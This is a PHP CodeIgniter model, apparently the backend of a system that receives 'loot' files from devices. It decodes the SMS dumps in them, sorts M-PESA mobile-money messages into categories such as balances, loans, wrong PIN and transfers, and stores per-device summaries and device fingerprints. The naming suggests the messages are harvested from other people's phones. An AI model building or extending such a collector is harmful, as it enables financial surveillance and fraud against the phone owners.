<?php

namespace App\Models;

use CodeIgniter\API\ResponseTrait;

use CodeIgniter\Model;

use App\Models\ModCryption;

class ModUploads extends Model
{
    use ResponseTrait;
    protected $table = "tbl_Loot";

    public function file_upload($data){
        return $this->db->table('tbl_Loot')->insert($data);
    }

    public function loot_last_uploaded(){
        $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
        //return $result->getResult()[0]->loot_Id;
        return $result->getResult()[0]->loot_Uuid;
    }

    public function loot_info($loot_uuid){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get();
        return $result->getResult();
    }

    public function loot_info_all($loot_uuid){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->where('loot_Uuid', $loot_uuid)
            ->get();
        return $result->getResult();
    }

    public function loot_summary($loot_uuid){
        $builder = $this->db->table('tbl_Loot_Summary');
        $result = $builder->where('loot_Uuid', $loot_uuid)->get();
        return $result->getResult();
    }

    public function loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated){
        $mod_cryption = new ModCryption();
        $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
            //->where('loot_Id', $loot_id)->get()->getResult();
            ->where('loot_Uuid', $loot_uuid)->get()->getResult();
        $loot_name = $query_name[0]->loot_Name;
        $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;

        $loot_data = file_get_contents($loot_file);
        $loot_decoded = $mod_cryption->decode_content($loot_data);
        //echo gettype($loot_decoded);

        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
        $data_dump2 = str_replace("\n", '****', $data_dump1);
        $data_dump3 = str_replace('****"', '"', $data_dump2);
        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";

        $data = json_encode($data_dump4);
        $data1 = json_decode($data);
        $data2 = json_decode($data1);

        $sms_get_receive = "confirmed.you have received ksh";;
        $sms_get_bank = "confirmed.you have received ksh";
        $sms_get_mshwari = "transferred from m-shwari account on";
        $sms_get_from_ncba = "from ncba bank on";
        $sms_get_from_im_bank = "from im bank limited- app on";

        $sms_get_bal = " confirmed. your account balance was";
        $sms_get_bal_kcb = "confirmed. your kcb m-pesa";
        $sms_get_bal_mshwari = "confirmed . your m-shwari deposit account";
        $sms_get_reversal = "confirmed. reversal of transaction";

        $sms_loan_limit = "confirmed. your loan limit is";
        ##your kcb m-pesa loan request will be processed shortly.

        $sms_sent = strtolower(" confirmed. ksh");
        $sms_sent_mini = strtolower(" confirmed. you have transfered ksh");
        $sms_sent_mshwari = strtolower("transferred to m-shwari account on");
        $sms_sent_cancel = strtolower("you have cancelled the transaction");

        $sms_error_failed = "failed.";
        $sms_error_pay_merchant = strtolower("the username does not exist or the security credential is incorrect.");
        $sms_error_pin = strtolower("you have entered the wrong pin");
        $sms_error_less = strtolower("insufficient funds in your");
        $sms_error_receiver = strtolower("the number you are trying to pay has not joined the service");
        $sms_error_receiver_org = strtolower("transaction failed, m-pesa cannot complete payment of");

        $sms_withdraw = strtolower("confirmed.on");

        $sms_fuliza_leave = strtolower("you have successfully opted out of fuliza m-pesa service.");
        $sms_fuliza_opt_in = strtolower("you have successfully opted into fuliza m-pesa.");
        $sms_fuliza_limit = strtolower("your fuliza m-pesa limit is ksh");
        $sms_fuliza_mini_statement = strtolower("your fuliza m-pesa mini statement is as follows");
        $sms_fuliza_loan_taken = strtolower("confirmed. fuliza m-pesa amount is");
        $fuliza = "Confirmed. Fuliza M-PESA";

        $sms_similar_transaction = strtolower("m-pesa is unable to process your request because a similar transaction is currently underway. please wait while we complete your initial request");

        $count_get_bank = 0;
        $count_get_receive = 0; $count_get_mshwari = 0; $count_get_from_ncba = 0; $count_get_from_im_bank = 0;
        $count_get_bal = 0; $count_get_bal_kcb = 0; $count_get_bal_mshwari = 0; $count_get_reversal = 0; $count_loan_limit = 0;
        $count_sent = 0; $count_sent_mini = 0; $count_sent_mshwari = 0; $count_sent_cancel = 0;
        $count_error_failed = 0; $count_error_pay_merchant = 0; $count_error_pin = 0; $count_error_less = 0; $count_error_receiver = 0;
        $count_error_receiver_org = 0; $count_withdraw = 0;
        $count_fuliza = 0; $count_unknown = 0;
        $count_fuliza_leave = 0; $count_fuliza_opt_in = 0; $count_fuliza_limit = 0; $count_fuliza_mini_statement = 0;
        $count_fuliza_loan_taken = 0; $count_similar_transaction = 0;

        foreach ($data2 as $smsdata) {
            if($smsdata->Number == "MPESA"){
                $sms_clean = strtolower(base64_decode($smsdata->Body));

                if (stripos($sms_clean, $sms_similar_transaction)){
                    $count_similar_transaction+=1;
                    $sms_cat = "Similar Transaction";
                }else if (stripos($sms_clean, $sms_fuliza_loan_taken)){
                    $count_fuliza_loan_taken+=1;
                    $sms_cat = "Fuliza Loan Taken";
                }else if (stripos($sms_clean, $sms_fuliza_mini_statement) ){
                    $count_fuliza_mini_statement+=1;
                    $sms_cat = "Fuliza Mini Statement";
                }else if (stripos($sms_clean, $sms_fuliza_limit)){
                    $count_fuliza_limit+=1;
                    $sms_cat = "Fuliza Limit";
                }else if (stripos($sms_clean, $sms_fuliza_opt_in)){
                    $count_fuliza_opt_in+=1;
                    $sms_cat = "Fuliza Opt In";
                }else if (stripos($sms_clean, $sms_fuliza_leave)){
                    $count_fuliza_leave+=1;
                    $sms_cat = "Fuliza Leave";
                }else if (stripos($sms_clean, $fuliza)){
                    $count_fuliza+=1;
                    $sms_cat = "Fuliza";
                }

                else if (stripos($sms_clean, $sms_get_receive) ){
                    $count_get_receive+=1;
                    $sms_cat = "Received from Mpesa";
                }else if (stripos($sms_clean, $sms_get_mshwari)){
                    $count_get_mshwari+=1;
                    $sms_cat = "Received from Mshwari";
                }else if (stripos($sms_clean, $sms_get_from_ncba)){
                    $count_get_from_ncba+=1;
                    $sms_cat = "Received from NCBA";
                }else if (stripos($sms_clean, $sms_get_from_im_bank) ){
                    $count_get_from_im_bank+=1;
                    $sms_cat = "Received from IM";
                }else if (stripos($sms_clean, $sms_get_bal)){
                    $count_get_bal+=1;
                    $sms_cat = "Get MPESA Balance";
                }else if (stripos($sms_clean, $sms_get_bal_kcb)){
                    $count_get_bal_kcb+=1;
                    $sms_cat = "Get KCB Balance";
                }else if (stripos($sms_clean, $sms_get_bal_mshwari)){
                    $count_get_bal_mshwari+=1;
                    $sms_cat = "Get MShwari Balance";
                }else if (stripos($sms_clean, $sms_get_reversal) ){
                    $count_get_reversal+=1;
                    $sms_cat = "Received from Reversal";
                }else if (stripos($sms_clean, $sms_loan_limit)){
                    $count_loan_limit+=1;
                    $sms_cat = "Get Limit";
                }

                else if (stripos($sms_clean, $sms_sent)){
                    $count_sent+=1;
                    $sms_cat = "Sent to Mpesa";
                }else if (stripos($sms_clean, $sms_sent_mini)){
                    $count_sent_mini+=1;
                    $sms_cat = "Sent Statement";
                }else if (stripos($sms_clean, $sms_sent_mshwari)){
                    $count_sent_mshwari+=1;
                    $sms_cat = "Sent to Mshwari";
                }else if (stripos($sms_clean, $sms_sent_cancel)){
                    $count_sent_cancel+=1;
                    $sms_cat = "Transaction Cancelled";
                }

                else if (stripos($sms_clean, $sms_error_pin)){
                    $count_error_pin+=1;
                    $sms_cat = "Wrong Pin";
                }else if (stripos($sms_clean, $sms_error_less)){
                    $count_error_less+=1;
                    $sms_cat = "Insufficient funds";
                }else if (stripos($sms_clean, $sms_error_receiver)){
                    $count_error_receiver+=1;
                    $sms_cat = "Receiver not in Service";
                }else if (stripos($sms_clean, $sms_error_receiver_org)){
                    $count_error_receiver_org+=1;
                    $sms_cat = "Org not in Service";
                }else if (stripos($sms_clean, $sms_error_pay_merchant)){
                    $count_error_pay_merchant+=1;
                    $sms_cat = "Wrong Merchant";
                }

                else if (stripos($sms_clean, $sms_withdraw)){
                    $count_withdraw+=1;
                    $sms_cat = "Withdraw";
                }
                else {
                    $count_unknown+=1;
                    $sms_cat = "Unknown";
                }

                $thread_id = 'Thread Id';
                $data = array(
                    'sms_type' => $smsdata->Type,
                    'sms_number' => $smsdata->Number,
                    'sms_thread_id' => $smsdata->$thread_id,
                    'sms_time' => $smsdata->Date,
                    'sms_category' => $sms_cat,
                    'sms_seen' => $smsdata->Seen,
                    'sms__id' => $smsdata->ID,
                    'sms_body' => $smsdata->Body,
                    'sms_loot_source' => $loot_uuid,
                    'sms_owner' => $loot_owner,
                    'sms_device' => $loot_device,
                );
                $this->db ->table('tbl_Sms')->insert($data);
            }
        }

        $builder1 = $this->db->table('tbl_Sms');
        $get_all = $builder1
            ->select('*')//sms_category, COUNT(*) as counted
            ->where('sms_device', $loot_device)
            ->where('sms_owner', $loot_owner)
            ->where('sms_loot_source', $loot_uuid)
            //->groupBy('sms_category')
            ->get();
        $loot_summary_sms_categories =  $get_all->getResult();
        $count_all_sms_count = count($loot_summary_sms_categories);

        $data1 = array(
            'Loot_Uuid' => $loot_uuid,
            'info_Get_Receive' => $count_get_receive,
            'info_Get_Bank' => $count_get_bank,
            'info_Get_Mshwari' => $count_get_bal_mshwari,
            'info_Get_from_NCBA' => $count_get_from_ncba,
            'info_Get_from_IM' => $count_get_from_im_bank,
            'info_Get_Bal' => $count_get_bal,
            'info_Get_Bal_KCB' => $count_get_bal_kcb,
            'info_Get_Bal_Mshwari' => $count_get_bal_mshwari,
            'info_Get_Reversal' => $count_get_reversal,
            'info_Loan_Limit' => $count_loan_limit,
            'info_Sent' => $count_sent,
            'info_Sent_Mini' => $count_sent_mini,
            'info_Sent_Mshwari' => $count_sent_mshwari,
            'info_Sent_Cancel' => $count_sent_cancel,
            'info_Error_Failed' => $count_error_failed,
            'info_Error_Pay_Merchant' => $count_error_pay_merchant,
            'info_Error_Pin' => $count_error_pin,
            'info_Error_Less' => $count_error_less,
            'info_Error_Receiver' => $count_error_receiver,
            'info_Error_Receiver_Org' => $count_error_receiver_org,
            'info_Withdraw' => $count_withdraw,
            'info_Fuliza_Leave' => $count_fuliza_leave,
            'info_Fuliza_Opt_In' => $count_fuliza_opt_in,
            'info_Fuliza_Limit' => $count_fuliza_limit,
            'info_Fuliza_Mini_Statement' => $count_fuliza_mini_statement,
            'info_Fuliza_Loan_Taken' => $count_fuliza_loan_taken,
            'info_Similar_Transaction' => $count_similar_transaction,
            'info_Unknown' => $count_unknown,
            'info_All' => $count_all_sms_count,
            'loot_Created' => $dated
        );
        $this->db ->table('tbl_Loot_Summary')->insert($data1);

    }

    public function file_listing($loot_owner, $loot_device){
        $builder = $this->db->table('tbl_Loot');
        $get_all = $builder
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get();
        return $get_all->getResult();
    }

    public function file_delete($userid){
        $table = 'tbl_users';
    }

    public function device_check_print($print_dump){
        $builder = $this->db->table('tbl_Devices');
        $get_all = $builder->select('device_Uuid')
                ->where($print_dump)
                ->get();
        return $get_all->getResult();
    }

    public function get_loot_uuid($loot_name){
        $builder = $this->db->table('tbl_Loot');
        $get_all = $builder->select('loot_Uuid')
                ->where('loot_Name', $loot_name)
                ->get();
        return $get_all->getResult()[0]->loot_Uuid;
    }

	public function get_loot_summary_from_uuids($loot_aray_uuids){
        $builder = $this->db->table('tbl_Loot_Summary');
        $get_all = $builder->select('*')
                ->whereIn('loot_Uuid', $loot_aray_uuids)
                ->get();
        return $get_all->getResult();
    }
    
    public function device_make_print($print_dump){
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }
}
